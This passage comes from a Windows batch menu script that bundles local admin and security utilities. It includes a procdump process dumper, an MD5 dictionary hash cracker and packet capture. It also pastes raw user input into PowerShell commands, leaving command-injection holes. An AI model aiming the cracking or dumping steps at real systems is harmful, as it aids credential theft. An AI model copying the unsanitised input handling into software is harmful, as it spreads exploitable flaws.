    "$tcp=New-Object Net.Sockets.TcpClient('%host%',443);$ssl=[System.Net.Security.SslStream]::new($tcp.GetStream(),$false,({param($s,$c,$p) $true}));$ssl.AuthenticateAsClient('%host%');$cert=$ssl.RemoteCertificate;$x=[System.Security.Cryptography.X509Certificates.X509Certificate2]::new($cert);Write-Host 'Subject:' $x.Subject;Write-Host 'Issuer:' $x.Issuer;Write-Host 'Valid From:' $x.NotBefore;Write-Host 'Valid To:' $x.NotAfter;Write-Host 'Thumbprint:' $x.Thumbprint"
pause
goto menu


:servicesviewer
cls
echo --- Running Services Viewer ---
sc query state= all | findstr /I "SERVICE_NAME STATE"
pause
goto menu

#           █████               █████                                                                                                          
#          ░░███               ░░███                                                                                                           
#   █████  ███████    ██████   ███████   █████ ████ ████████  ████████  ████████   ██████   ███████ ████████   ██████   █████████████    █████ 
#  ███░░  ░░░███░    ░░░░░███ ░░░███░   ░░███ ░███ ░░███░░███░░███░░███░░███░░███ ███░░███ ███░░███░░███░░███ ░░░░░███ ░░███░░███░░███  ███░░  
# ░░█████   ░███      ███████   ░███     ░███ ░███  ░███ ░███ ░███ ░███ ░███ ░░░ ░███ ░███░███ ░███ ░███ ░░░   ███████  ░███ ░███ ░███ ░░█████ 
#  ░░░░███  ░███ ███ ███░░███   ░███ ███ ░███ ░███  ░███ ░███ ░███ ░███ ░███     ░███ ░███░███ ░███ ░███      ███░░███  ░███ ░███ ░███  ░░░░███
#  ██████   ░░█████ ░░████████  ░░█████  ░░████████ ░███████  ░███████  █████    ░░██████ ░░███████ █████    ░░████████ █████░███ █████ ██████ 
# ░░░░░░     ░░░░░   ░░░░░░░░    ░░░░░    ░░░░░░░░  ░███░░░   ░███░░░  ░░░░░      ░░░░░░   ░░░░░███░░░░░      ░░░░░░░░ ░░░░░ ░░░ ░░░░░ ░░░░░░  
#                                                   ░███      ░███                         ███ ░███                                            
#                                                   █████     █████                       ░░██████                                             
#                                                  ░░░░░     ░░░░░                         ░░░░░░        
:startupprograms
cls
echo --- Startup Programs ---
echo HKLM Run keys:
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
echo HKCU Run keys:
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
echo Startup folders:
if exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" dir "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" dir "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
pause
goto menu

#  ████                                          █████                                  █████                      
# ░░███                                         ░░███                                  ░░███                       
#  ░███   ██████   ███████  ██████  █████ █████ ███████   ████████   ██████    ██████  ███████    ██████  ████████ 
#  ░███  ███░░███ ███░░███ ███░░███░░███ ░░███ ░░░███░   ░░███░░███ ░░░░░███  ███░░███░░░███░    ███░░███░░███░░███
#  ░███ ░███ ░███░███ ░███░███████  ░░░█████░    ░███     ░███ ░░░   ███████ ░███ ░░░   ░███    ░███ ░███ ░███ ░░░ 
#  ░███ ░███ ░███░███ ░███░███░░░    ███░░░███   ░███ ███ ░███      ███░░███ ░███  ███  ░███ ███░███ ░███ ░███     
#  █████░░██████ ░░███████░░██████  █████ █████  ░░█████  █████    ░░████████░░██████   ░░█████ ░░██████  █████    
# ░░░░░  ░░░░░░   ░░░░░███ ░░░░░░  ░░░░░ ░░░░░    ░░░░░  ░░░░░      ░░░░░░░░  ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     
#                 ███ ░███                                                                                         
#                ░░██████                                                                                          
#                 ░░░░░░  
:logextractor
cls
echo --- Event Log Extractor (last 50 entries) ---
echo System:
wevtutil qe System /c:50 /f:text
echo.
echo Security (requires admin):
wevtutil qe Security /c:50 /f:text
pause
goto menu

#     ██████   ███  ████                                     █████                  █████            █████             
#    ███░░███ ░░░  ░░███                                    ░░███                  ░░███            ░░███              
#   ░███ ░░░  ████  ░███   ██████  █████████████    ██████  ███████    ██████    ███████   ██████   ███████    ██████  
#  ███████   ░░███  ░███  ███░░███░░███░░███░░███  ███░░███░░░███░    ░░░░░███  ███░░███  ░░░░░███ ░░░███░    ░░░░░███ 
# ░░░███░     ░███  ░███ ░███████  ░███ ░███ ░███ ░███████   ░███      ███████ ░███ ░███   ███████   ░███      ███████ 
#   ░███      ░███  ░███ ░███░░░   ░███ ░███ ░███ ░███░░░    ░███ ███ ███░░███ ░███ ░███  ███░░███   ░███ ███ ███░░███ 
#   █████     █████ █████░░██████  █████░███ █████░░██████   ░░█████ ░░████████░░████████░░████████  ░░█████ ░░████████
#  ░░░░░     ░░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░ ░░░░░  ░░░░░░     ░░░░░   ░░░░░░░░  ░░░░░░░░  ░░░░░░░░    ░░░░░   ░░░░░░░░ 
#                                                                                                                      
#                                                                                                                      
#    
:filemetadata
cls
echo --- File Metadata Viewer ---
set /p "file=Enter file path: "
powershell -NoProfile -Command ^
    "Get-Item '%file%' | Select FullName,Length,LastWriteTime,CreationTime; if((Get-Item '%file%').Extension -match 'jpg|jpeg|png|tif|tiff'){Add-Type -AssemblyName System.Drawing; $img=[System.Drawing.Image]::FromFile('%file%'); $prop=$img.PropertyItems; foreach($p in $prop){Write-Host $p.Id $p.Type $p.Length}; $img.Dispose()}"
pause
goto menu

#                               ███           █████                                                                       █████     
#                              ░░░           ░░███                                                                       ░░███      
#  ████████   ██████   ███████ ████   █████  ███████   ████████  █████ ████  █████   ██████   ██████   ████████   ██████  ░███████  
# ░░███░░███ ███░░███ ███░░███░░███  ███░░  ░░░███░   ░░███░░███░░███ ░███  ███░░   ███░░███ ░░░░░███ ░░███░░███ ███░░███ ░███░░███ 
#  ░███ ░░░ ░███████ ░███ ░███ ░███ ░░█████   ░███     ░███ ░░░  ░███ ░███ ░░█████ ░███████   ███████  ░███ ░░░ ░███ ░░░  ░███ ░███ 
#  ░███     ░███░░░  ░███ ░███ ░███  ░░░░███  ░███ ███ ░███      ░███ ░███  ░░░░███░███░░░   ███░░███  ░███     ░███  ███ ░███ ░███ 
#  █████    ░░██████ ░░███████ █████ ██████   ░░█████  █████     ░░███████  ██████ ░░██████ ░░████████ █████    ░░██████  ████ █████
# ░░░░░      ░░░░░░   ░░░░░███░░░░░ ░░░░░░     ░░░░░  ░░░░░       ░░░░░███ ░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░░      ░░░░░░  ░░░░ ░░░░░ 
#                     ███ ░███                                    ███ ░███                                                          
#                    ░░██████                                    ░░██████                                                           
#                     ░░░░░░                                      ░░░░░░    
:registrysearch
cls
echo --- Registry Key Searcher ---
set /p "term=Enter search string: "
echo Searching HKLM...
reg query HKLM /f "%term%" /s 2>nul
echo Searching HKCU...
reg query HKCU /f "%term%" /s 2>nul
pause
goto menu

#                                                                     █████                                                        
#                                                                    ░░███                                                         
#  ████████  ████████   ██████   ██████   ██████   █████   █████   ███████  █████ ████ █████████████   ████████   ██████  ████████ 
# ░░███░░███░░███░░███ ███░░███ ███░░███ ███░░███ ███░░   ███░░   ███░░███ ░░███ ░███ ░░███░░███░░███ ░░███░░███ ███░░███░░███░░███
#  ░███ ░███ ░███ ░░░ ░███ ░███░███ ░░░ ░███████ ░░█████ ░░█████ ░███ ░███  ░███ ░███  ░███ ░███ ░███  ░███ ░███░███████  ░███ ░░░ 
#  ░███ ░███ ░███     ░███ ░███░███  ███░███░░░   ░░░░███ ░░░░███░███ ░███  ░███ ░███  ░███ ░███ ░███  ░███ ░███░███░░░   ░███     
#  ░███████  █████    ░░██████ ░░██████ ░░██████  ██████  ██████ ░░████████ ░░████████ █████░███ █████ ░███████ ░░██████  █████    
#  ░███░░░  ░░░░░      ░░░░░░   ░░░░░░   ░░░░░░  ░░░░░░  ░░░░░░   ░░░░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░  ░███░░░   ░░░░░░  ░░░░░     
#  ░███                                                                                                ░███                        
#  █████                                                                                               █████                       
# ░░░░░   
:processdumper
cls
echo --- Process Dumper (basic) ---
set /p "pid=Enter PID to dump: "
if exist "procdump.exe" (
    procdump.exe -ma %pid% "dump_%pid%.dmp"
    echo Dump saved to dump_%pid%.dmp
) else (
    echo procdump.exe not found. Download Sysinternals procdump.exe and place it here.
)
pause
goto menu

#                                █████          █████                                            █████    █████     
#                               ░░███          ░░███                                            ░░███    ░░███      
#  ████████  █████ ███ █████  ███████   █████  ███████   ████████   ██████  ████████    ███████ ███████   ░███████  
# ░░███░░███░░███ ░███░░███  ███░░███  ███░░  ░░░███░   ░░███░░███ ███░░███░░███░░███  ███░░███░░░███░    ░███░░███ 
#  ░███ ░███ ░███ ░███ ░███ ░███ ░███ ░░█████   ░███     ░███ ░░░ ░███████  ░███ ░███ ░███ ░███  ░███     ░███ ░███ 
#  ░███ ░███ ░░███████████  ░███ ░███  ░░░░███  ░███ ███ ░███     ░███░░░   ░███ ░███ ░███ ░███  ░███ ███ ░███ ░███ 
#  ░███████   ░░████░████   ░░████████ ██████   ░░█████  █████    ░░██████  ████ █████░░███████  ░░█████  ████ █████
#  ░███░░░     ░░░░ ░░░░     ░░░░░░░░ ░░░░░░     ░░░░░  ░░░░░      ░░░░░░  ░░░░ ░░░░░  ░░░░░███   ░░░░░  ░░░░ ░░░░░ 
#  ░███                                                                                ███ ░███                     
#  █████                                                                              ░░██████                      
# ░░░░░   
:pwdstrength
cls
echo --- Password Strength Checker ---
set /p "pwd=Enter password (won't be stored): "
powershell -NoProfile -Command ^
    "$p='%pwd%'; $score=0; if($p.Length -ge 8){$score+=1}; if($p.Length -ge 12){$score+=1}; if($p -match '\\d'){$score+=1}; if($p -match '[A-Z]'){$score+=1}; if($p -match '[a-z]'){$score+=1}; if($p -match '\\W'){$score+=1}; Write-Host 'Strength score (0-6):' $score"
pause
goto menu

#  █████                        █████                                            █████                        
# ░░███                        ░░███                                            ░░███                         
#  ░███████    ██████    █████  ░███████    ██████  ████████   ██████    ██████  ░███ █████  ██████  ████████ 
#  ░███░░███  ░░░░░███  ███░░   ░███░░███  ███░░███░░███░░███ ░░░░░███  ███░░███ ░███░░███  ███░░███░░███░░███
#  ░███ ░███   ███████ ░░█████  ░███ ░███ ░███ ░░░  ░███ ░░░   ███████ ░███ ░░░  ░██████░  ░███████  ░███ ░░░ 
#  ░███ ░███  ███░░███  ░░░░███ ░███ ░███ ░███  ███ ░███      ███░░███ ░███  ███ ░███░░███ ░███░░░   ░███     
#  ████ █████░░████████ ██████  ████ █████░░██████  █████    ░░████████░░██████  ████ █████░░██████  █████    
# ░░░░ ░░░░░  ░░░░░░░░ ░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░      ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░     
:hashcracker
cls
echo --- Hash Cracker (offline, MD5 only) ---
set /p "hash=Enter MD5 hash: "
set /p "dict=Enter dictionary file path: "
if not exist "%dict%" (
    echo Dictionary file not found.
    pause
    goto menu
)
powershell -NoProfile -Command ^
    "$h='%hash%'.ToLower(); Get-Content '%dict%' | ForEach-Object { $m=([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($_)); $hex=[BitConverter]::ToString($m) -replace '-', ''; if($hex.ToLower() -eq $h){Write-Host 'FOUND:' $_; exit} }"
pause
goto menu

#  █████                           █████                ██████                                      
# ░░███                           ░░███                ███░░███                                     
#  ░███████  ████████  █████ ████ ███████    ██████   ░███ ░░░   ██████  ████████   ██████   ██████ 
#  ░███░░███░░███░░███░░███ ░███ ░░░███░    ███░░███ ███████    ███░░███░░███░░███ ███░░███ ███░░███
#  ░███ ░███ ░███ ░░░  ░███ ░███   ░███    ░███████ ░░░███░    ░███ ░███ ░███ ░░░ ░███ ░░░ ░███████ 
#  ░███ ░███ ░███      ░███ ░███   ░███ ███░███░░░    ░███     ░███ ░███ ░███     ░███  ███░███░░░  
#  ████████  █████     ░░████████  ░░█████ ░░██████   █████    ░░██████  █████    ░░██████ ░░██████ 
# ░░░░░░░░  ░░░░░       ░░░░░░░░    ░░░░░   ░░░░░░   ░░░░░      ░░░░░░  ░░░░░      ░░░░░░   ░░░░░░  
:bruteforce
cls
echo --- Brute Force Simulator (educational) ---
echo This simulates trying passwords from a dictionary against an MD5 hash.
set /p "hash=Enter MD5 hash: "
set /p "dict=Enter dictionary file path: "
if not exist "%dict%" (
    echo Dictionary file not found.
    pause
    goto menu
)
powershell -NoProfile -Command ^
    "$h='%hash%'.ToLower(); Get-Content '%dict%' | ForEach-Object { Start-Sleep -Milliseconds 200; $m=([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($_)); $hex=[BitConverter]::ToString($m) -replace '-', ''; Write-Host 'Trying:' $_; if($hex.ToLower() -eq $h){Write-Host 'MATCH:' $_; exit} }"
pause
goto menu

#     ██████   ███                                               ████  ████                       ████                  
#    ███░░███ ░░░                                               ░░███ ░░███                      ░░███                  
#   ░███ ░░░  ████  ████████   ██████  █████ ███ █████  ██████   ░███  ░███  ████████  █████ ████ ░███   ██████   █████ 
#  ███████   ░░███ ░░███░░███ ███░░███░░███ ░███░░███  ░░░░░███  ░███  ░███ ░░███░░███░░███ ░███  ░███  ███░░███ ███░░  
# ░░░███░     ░███  ░███ ░░░ ░███████  ░███ ░███ ░███   ███████  ░███  ░███  ░███ ░░░  ░███ ░███  ░███ ░███████ ░░█████ 
#   ░███      ░███  ░███     ░███░░░   ░░███████████   ███░░███  ░███  ░███  ░███      ░███ ░███  ░███ ░███░░░   ░░░░███
#   █████     █████ █████    ░░██████   ░░████░████   ░░████████ █████ █████ █████     ░░████████ █████░░██████  ██████ 
#  ░░░░░     ░░░░░ ░░░░░      ░░░░░░     ░░░░ ░░░░     ░░░░░░░░ ░░░░░ ░░░░░ ░░░░░       ░░░░░░░░ ░░░░░  ░░░░░░  ░░░░░░ 
:firewallrules
cls
echo --- Windows Firewall Rules ---
netsh advfirewall firewall show rule name=all
pause
goto menu

#                         ████                      █████                        █████                        
#                        ░░███                     ░░███                        ░░███                         
#  █████ █████ █████ ████ ░███  ████████    ██████  ░███████    ██████   ██████  ░███ █████  ██████  ████████ 
# ░░███ ░░███ ░░███ ░███  ░███ ░░███░░███  ███░░███ ░███░░███  ███░░███ ███░░███ ░███░░███  ███░░███░░███░░███
#  ░███  ░███  ░███ ░███  ░███  ░███ ░███ ░███ ░░░  ░███ ░███ ░███████ ░███ ░░░  ░██████░  ░███████  ░███ ░░░ 
#  ░░███ ███   ░███ ░███  ░███  ░███ ░███ ░███  ███ ░███ ░███ ░███░░░  ░███  ███ ░███░░███ ░███░░░   ░███     
#   ░░█████    ░░████████ █████ ████ █████░░██████  ████ █████░░██████ ░░██████  ████ █████░░██████  █████    
#    ░░░░░      ░░░░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░ ░░░░░  ░░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░  
:vulnchecker
cls
echo --- Vulnerability Checker (local heuristic) ---
echo 1) Installed Programs:
wmic product get name,version 2>nul | more
echo.
echo 2) Missing Windows Updates (top 10):
powershell -NoProfile -Command ^
    "(New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search('IsInstalled=0').Updates | Select-Object -First 10 | Format-Table Title,KBArticleIDs -AutoSize"
pause
goto menu

#                               █████                █████                                  █████                                 
#                              ░░███                ░░███                                  ░░███                                  
#  ████████   ██████    ██████  ░███ █████  ██████  ███████    ██████   ██████   ████████  ███████   █████ ████ ████████   ██████ 
# ░░███░░███ ░░░░░███  ███░░███ ░███░░███  ███░░███░░░███░    ███░░███ ░░░░░███ ░░███░░███░░░███░   ░░███ ░███ ░░███░░███ ███░░███
#  ░███ ░███  ███████ ░███ ░░░  ░██████░  ░███████   ░███    ░███ ░░░   ███████  ░███ ░███  ░███     ░███ ░███  ░███ ░░░ ░███████ 
#  ░███ ░███ ███░░███ ░███  ███ ░███░░███ ░███░░░    ░███ ███░███  ███ ███░░███  ░███ ░███  ░███ ███ ░███ ░███  ░███     ░███░░░  
#  ░███████ ░░████████░░██████  ████ █████░░██████   ░░█████ ░░██████ ░░████████ ░███████   ░░█████  ░░████████ █████    ░░██████ 
#  ░███░░░   ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░  ░░░░░░     ░░░░░   ░░░░░░   ░░░░░░░░  ░███░░░     ░░░░░    ░░░░░░░░ ░░░░░      ░░░░░░  
#  ░███                                                                          ░███                                             
#  █████                                                                         █████                                            
# ░░░░░
:packetcapture
cls
echo --- Packet Capture Launcher ---
if exist "tshark.exe" (
    echo tshark found. Starting capture (Ctrl+C to stop)...
    tshark.exe -i 1 -w "capture_%random%.pcap"
) else (
    echo tshark.exe not found. Copy tshark.exe here or use Windump/tcpdump.
)
pause
goto menu

#  █████                                 ████████  █████ █████  █████                          
# ░░███                                 ███░░░░███░░███ ░░███  ░░███                           
#  ░███████   ██████    █████   ██████ ░███   ░░░  ░███  ░███ █ ░███████    ██████  █████ █████
#  ░███░░███ ░░░░░███  ███░░   ███░░███░█████████  ░███████████ ░███░░███  ███░░███░░███ ░░███ 
#  ░███ ░███  ███████ ░░█████ ░███████ ░███░░░░███ ░░░░░░░███░█ ░███ ░███ ░███████  ░░░█████░  
#  ░███ ░███ ███░░███  ░░░░███░███░░░  ░███   ░███       ░███░  ░███ ░███ ░███░░░    ███░░░███ 
#  ████████ ░░████████ ██████ ░░██████ ░░████████        █████  ████ █████░░██████  █████ █████
# ░░░░░░░░   ░░░░░░░░ ░░░░░░   ░░░░░░   ░░░░░░░░        ░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░
:base64hex
cls
echo --- Base64 / Hex Encoder-Decoder ---
set /p "mode=Choose encode (e) or decode (d): "
set /p "format=Choose format base64 (b) or hex (h): "
set /p "input=Enter text or 'file:<path>' to read from file: "

set "content="
if /i "%input:~0,5%"=="file:" (
    set "file=%input:~5%"
    if exist "%file%" (
        set /p "content="<"%file%"
    ) else (
        echo File not found.
        pause
        goto menu
    )
) else (
    set "content=%input%"
)

if /i "%format%"=="b" (
    if /i "%mode%"=="e" (
        powershell -NoProfile -Command "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('%content%'))"
    ) else (
        powershell -NoProfile -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%content%'))"
    )
) else (
    if /i "%mode%"=="e" (
        powershell -NoProfile -Command "-join (( '%content%' ).ToCharArray() | ForEach-Object { '{0:X2}' -f [int][char]$_ })"
    ) else (
        powershell -NoProfile -Command "$h='%content%'; -join ([System.Text.Encoding]::UTF8.GetString((for($i=0; $i -lt $h.Length; $i+=2){ [Convert]::ToByte($h.Substring($i,2),16)})))"
    )
)
pause
goto menu

#      █████            █████                       █████        ██████                                         █████                      
#     ░░███            ░░███                       ░░███        ███░░███                                       ░░███                       
#   ███████   ██████   ███████    ██████    ██████  ░███████   ░███ ░░░  █████ ████  █████   ██████   ██████   ███████    ██████  ████████ 
#  ███░░███  ░░░░░███ ░░░███░    ░░░░░███  ███░░███ ░███░░███ ███████   ░░███ ░███  ███░░   ███░░███ ░░░░░███ ░░░███░    ███░░███░░███░░███
# ░███ ░███   ███████   ░███      ███████ ░███ ░███ ░███ ░███░░░███░     ░███ ░███ ░░█████ ░███ ░░░   ███████   ░███    ░███ ░███ ░███ ░░░ 
# ░███ ░███  ███░░███   ░███ ███ ███░░███ ░███ ░███ ░███ ░███  ░███      ░███ ░███  ░░░░███░███  ███ ███░░███   ░███ ███░███ ░███ ░███     
# ░░████████░░████████  ░░█████ ░░████████░░██████  ████████   █████     ░░████████ ██████ ░░██████ ░░████████  ░░█████ ░░██████  █████    
#  ░░░░░░░░  ░░░░░░░░    ░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░░░░   ░░░░░       ░░░░░░░░ ░░░░░░   ░░░░░░   ░░░░░░░░    ░░░░░   ░░░░░░  ░░░░░  
:dataobfuscator
cls
echo --- Data Obfuscator ---
set /p "file=Enter path to text file: "
set /p "out=Enter output file path: "
if not exist "%file%" (
    echo Input file not found.
    pause
    goto menu
)
powershell -NoProfile -Command "Get-Content '%file%' | ForEach-Object { $_ -replace '\d','X' -replace '\w','*' } | Set-Content '%out%'"
echo Obfuscated file saved to %out%
pause
goto menu

#           █████                                                                                           █████                
#          ░░███                                                                                           ░░███                 
#   █████  ███████    ██████   ███████  ██████   ████████    ██████   ███████ ████████   ██████   ████████  ░███████   █████ ████
#  ███░░  ░░░███░    ███░░███ ███░░███ ░░░░░███ ░░███░░███  ███░░███ ███░░███░░███░░███ ░░░░░███ ░░███░░███ ░███░░███ ░░███ ░███ 
# ░░█████   ░███    ░███████ ░███ ░███  ███████  ░███ ░███ ░███ ░███░███ ░███ ░███ ░░░   ███████  ░███ ░███ ░███ ░███  ░███ ░███ 
#  ░░░░███  ░███ ███░███░░░  ░███ ░███ ███░░███  ░███ ░███ ░███ ░███░███ ░███ ░███      ███░░███  ░███ ░███ ░███ ░███  ░███ ░███ 
#  ██████   ░░█████ ░░██████ ░░███████░░████████ ████ █████░░██████ ░░███████ █████    ░░████████ ░███████  ████ █████ ░░███████ 
# ░░░░░░     ░░░░░   ░░░░░░   ░░░░░███ ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░   ░░░░░███░░░░░      ░░░░░░░░  ░███░░░  ░░░░ ░░░░░   ░░░░░███ 
#                             ███ ░███                               ███ ░███                     ░███                  ███ ░███ 
#                            ░░██████                               ░░██████                      █████                ░░██████  
#                             ░░░░░░                                 ░░░░░░                      ░░░░░                  ░░░░░░ 
:steganography
cls
echo --- Steganography Tool (basic) ---
echo This is a very basic demo. Use specialized tools for real steganography.
set /p "image=Enter BMP image path: "
set /p "message=Enter short message to hide: "
if not exist "%image%" (
    echo Image not found.
    pause
    goto menu
)
echo (No actual encoding implemented here.)
echo For serious use, try steghide or OpenStego.
pause
goto menu